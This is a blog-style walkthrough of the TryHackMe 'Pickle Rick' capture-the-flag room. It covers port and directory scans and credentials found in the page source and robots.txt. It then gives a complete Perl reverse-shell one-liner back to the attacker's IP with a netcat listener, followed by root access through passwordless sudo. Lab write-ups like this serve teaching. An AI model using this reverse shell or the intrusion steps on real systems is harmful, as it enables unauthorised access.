+++
categories = ["Hugo"]
date = "2020-08-23"
description = "PickleRick TryHackMe Writeup"

featuredalt = ""
featuredpath = "date"
linktitle = ""
title = "PickleRick TryHackMe Writeup"
slug = "PickleRick TryHackMe Writeup"
type = "post"
+++

![LazyAdmin TryHackMe](https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg)


## Nmap Scan

```
nmap -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 13:25 EDT
Nmap scan report for 10.10.9.58
Host is up (0.39s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:a7:c7:d0:a7:0b:25:6c:d6:be:d9:5a:93:1c:d4:12 (RSA)
|   256 4f:16:df:a2:16:a0:44:05:bb:f5:f9:90:5f:54:fd:c4 (ECDSA)
|_  256 b6:cf:99:03:97:02:a8:47:39:ef:d0:06:df:66:a7:47 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.28 seconds
```

## From source code

```

    Note to self, remember username!

    Username: R1ckRul3s

```


## Gobuster scan 1

```
gobuster dir -u $ip -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.9.58
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 13:25:57 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
********* /robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/24 13:28:05 Finished
===============================================================
```

```
From /robots.txt


`
Wubbalubbadubdub
`
```


## Gobuster scan 2


```
gobuster dir -u $ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.9.58
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2020/05/24 13:34:09 Starting gobuster
===============================================================
/index.html (Status: 200)
********/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
Progress: 1075 / 220561 (0.49%)^Z
```


Go to /login.php

use username from source code
password from robots.txt


we can't use <cat> in the server

so let's do a reverse shell

```
command line : perl -e 'use Socket;$i="10.9.2.162";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
```

**host : nc -lnvp 9999**

ls there is one key

**cd /home/rick** {there is second key}

**sudo -l** {we can access root without any password}

**sudo su**

**cd /root {3rd key}**






























